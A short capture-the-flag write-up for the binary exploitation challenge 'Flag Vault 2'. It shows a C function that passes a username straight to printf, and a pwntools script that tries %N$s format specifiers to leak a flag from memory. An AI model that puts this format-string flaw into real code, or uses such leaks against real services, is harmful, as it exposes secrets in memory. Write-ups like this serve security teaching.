---
title: "Flag Vault 2"
categories: Binary Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
flags: THM{REDACTED}
---
> No description.

---

Given a binary, we can see that it is a simple program that reads a username. The flag is read from a file but is never printed to the screen. The user's input is printed to the screen as well.

```c
void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);
	
	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}
```

Ah, another classic format string vulnerability. We can use the `%s` format string to read the flag from memory. We can use the following script to read the flag:

```py
from pwn import *

binary = './pwn21'

context.log_level = 'debug'
context.binary = binary
context.endian = 'big'

for i in range(32):
    e = ELF(binary)
    r = process(binary)
    # r = remote('10.10.191.2', 1337)

    r.sendlineafter(b'Username: ', flat([
        f"%{i}$s",
    ]))

    r.interactive()
```
